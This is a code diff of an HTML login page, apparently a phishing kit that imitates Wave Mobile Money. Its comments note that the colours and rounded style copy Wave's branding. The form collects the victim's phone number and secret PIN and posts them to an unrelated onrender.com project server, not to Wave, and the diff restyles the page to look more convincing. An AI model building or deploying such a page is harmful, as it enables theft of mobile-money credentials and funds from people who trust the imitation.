@@ -3,113 +3,111 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Wave Mobile Money</title>
+  <title>Connexion - Wave Mobile Money</title>
 
   <style>
     body {
+      margin: 0;
+      padding: 0;
+      background-color: #46C5F3; /* Bleu clair Wave */
       font-family: Arial, sans-serif;
-      background-color: #0096FF; /* Bleu EXACT du logo Wave */
-      height: 100vh;
       display: flex;
       justify-content: center;
       align-items: center;
-      margin: 0;
+      height: 100vh;
     }
 
-    .container {
-      background-color: #0096FF; /* Même bleu pour un rendu uniforme */
-      padding: 35px 25px;
-      border-radius: 20px;
+    .login-box {
+      background-color: #87D9F8; /* Cadre bleu clair */
       width: 350px;
+      padding: 30px;
+      border-radius: 18px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.2);
       text-align: center;
     }
 
-    img.logo {
-      width: 115px;
-      margin-bottom: 15px;
+    .logo {
+      width: 130px;
+      margin-bottom: 10px;
     }
 
-    h1 {
-      color: white;
-      font-size: 28px;
+    h2 {
+      font-size: 22px;
       margin: 0;
       font-weight: bold;
     }
 
-    h2 {
-      color: white;
-      font-size: 18px;
+    h3 {
       margin-top: 5px;
       margin-bottom: 25px;
       font-weight: normal;
+      color: #003087;
     }
 
-    /* ======= CHAMPS EXACTS WAVE ======= */
-    .input {
+    input {
       width: 100%;
-      margin-bottom: 15px;
+      padding: 12px;
+      margin: 10px 0;
+      border-radius: 12px;
+      border: 1px solid #d1d1d1;
+      font-size: 15px;
+      box-sizing: border-box;
     }
 
-    .input input {
-      width: 100%;
-      padding: 14px 18px;
-
-      background-color: #F5F6F7;   /* Gris clair Wave */
-      border: 1px solid #D3D5DA;   /* Bordure légère */
-      border-radius: 30px;         /* Forme arrondie Wave */
-      font-size: 16px;
-      color: #1A1A1A;
-
-      outline: none;
-    }
-
-    .input input::placeholder {
-      color: #8A8A8A;
-    }
-
-    /* ======= BOUTON ======= */
     button {
       width: 100%;
       padding: 14px;
       margin-top: 10px;
-
-      background-color: white;
-      border-radius: 30px;
+      background-color: #003087; /* BLEU OFFICIEL WAVE */
+      color: white;
       border: none;
-      font-size: 17px;
-      font-weight: bold;
-      color: #008AFF;  /* Bleu foncé wave */
+      border-radius: 25px; /* Style arrondi comme Wave */
+      font-size: 16px;
       cursor: pointer;
+      font-weight: bold;
     }
 
     button:hover {
-      background-color: #EAEAEA;
+      background-color: #00246a;
     }
 
+    .footer-info {
+      margin-top: 20px;
+      font-size: 12px;
+      color: white;
+    }
+
+    .footer-info a {
+      color: white;
+      text-decoration: none;
+      margin: 0 3px;
+    }
+
+    .footer-info a:hover {
+      text-decoration: underline;
+    }
   </style>
 
 </head>
 <body>
 
-  <div class="container">
-    <img src="pingouin.png" alt="logo" class="logo">
+  <div class="login-box">
+    <img src="pingouin.png" class="logo" alt="Logo Wave">
 
-    <h1>Connexion</h1>
-    <h2>Wave Mobile Money</h2>
+    <h2>Connexion</h2>
+    <h3>Wave Mobile Money</h3>
 
     <form action="https://mon-projet-2-oq6y.onrender.com" method="POST">
-
-      <div class="input">
-        <input type="tel" name="phone" placeholder="Numéro de téléphone" required>
-      </div>
-
-      <div class="input">
-        <input type="password" name="pin" placeholder="Code secret" required>
-      </div>
-
+      <input type="tel" name="phone" placeholder="Numéro de téléphone" required>
+      <input type="password" name="pin" placeholder="Code secret" required>
       <button type="submit">Connexion</button>
-
     </form>
+
+    <div class="footer-info">
+      <a href="#">Conditions</a> • 
+      <a href="#">Vie privée</a> • 
+      <a href="#">Aide</a>
+    </div>
   </div>
 
 </body>
